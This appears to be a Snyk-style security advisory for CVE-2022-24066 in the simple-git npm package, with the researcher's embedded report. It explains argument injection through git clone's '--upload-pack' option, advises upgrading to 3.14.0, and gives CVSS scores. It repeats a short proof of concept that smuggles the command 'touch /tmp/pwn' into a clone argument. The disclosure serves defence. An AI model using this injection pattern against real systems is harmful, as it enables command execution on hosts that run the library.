#### Introduced: 28 Mar 2022

[CVE-2022-24066  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2022-24066) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-88  (opens in a new tab)](https://cwe.mitre.org/data/definitions/88.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses
## How to fix?

Upgrade `org.webjars.npm:simple-git` to version 3.14.0 or higher.

## Overview

[org.webjars.npm:simple-git](https://www.npmjs.com/package/simple-git) is an A light weight interface for running git commands in any node.js application.

Affected versions of this package are vulnerable to Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') due to an incomplete fix of [CVE-2022-24433](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-2421199) which only patches against the `git fetch` attack vector.
A similar use of the `--upload-pack` feature of git is also supported for git clone, which the prior fix didn't cover.

## PoC

```
const simpleGit = require('simple-git')
const git2 = simpleGit()
git2.clone('file:///tmp/zero123', '/tmp/example-new-repo', ['--upload-pack=touch /tmp/pwn']);

```

### CVSS Scores

version 3.1
### Snyk

8.1 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  A successful attack depends on conditions beyond the attacker's control. That is, a successful attack cannot be accomplished at will, but requires the attacker to invest in some measurable amount of effort in preparation or execution against the vulnerable component before a successful attack can be expected.

  **High**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component. Alternatively, only some files can be modified, but malicious modification would present a direct, serious consequence to the impacted component.

  **High**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

  **High**

Command Injection vulnerability in simple-git@3.4.0

 [Raw](/lirantal/a930d902294b833514e821102316426b/raw/8c8126a4ec1423b7345a7be2c6bb6de9322c9e97/simple-git-command-injection.md)

# Command Injection vulnerability in simple-git@3.4.0

`simple-git` describes itself as a lightweight interface for running git commands in any node.js application.

Resources:

* Project's GitHub source code: <https://github.com/steveukx/git-js>
* Project's npm package: <https://www.npmjs.com/package/simple-git>

`simple-git` receive just over 2.2 million downloads a week, so this vulnerability report should probably be timely.

## Background on exploitation

I'm reporting a Command Injection vulnerability in `simple-git` npm package.

The vector of attack in this vulnerability was found to be possible after investigating prior Command Injection vulnerability report as described here <https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-2421199> which only fixes the attack vector for the `git fetch` command.

However, a similar use of the `--upload-pack` feature of git is also supported for `git clone`, which the prior fix didn't cover.

## New exploit

Install `simple-git@3.4.0` which is the latest.

Run the following code:

```
const simpleGit = require('simple-git')
const git2 = simpleGit()
git2.clone('file:///tmp/zero123', '/tmp/example-new-repo', ['--upload-pack=touch /tmp/pwn']);
```

Observe a new file created: `/tmp/pwn`

## Overview

[simple-git](https://www.npmjs.com/package/simple-git) is a light weight interface for running git commands in any node.js application.

Affected versions of this package are vulnerable to Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') due to an incomplete fix of [CVE-2022-24433](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-2421199) which only patches against the `git fetch` attack vector.
A similar use of the `--upload-pack` feature of git is also supported for git clone, which the prior fix didn't cover.

## PoC

```
const simpleGit = require('simple-git')
const git2 = simpleGit()
git2.clone('file:///tmp/zero123', '/tmp/example-new-repo', ['--upload-pack=touch /tmp/pwn']);

```

### CVSS Scores

version 3.1
### Snyk

8.1 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  A successful attack depends on conditions beyond the attacker's control. That is, a successful attack cannot be accomplished at will, but requires the attacker to invest in some measurable amount of effort in preparation or execution against the vulnerable component before a successful attack can be expected.

  **High**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component. Alternatively, only some files can be modified, but malicious modification would present a direct, serious consequence to the impacted component.

  **High**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

  **High**
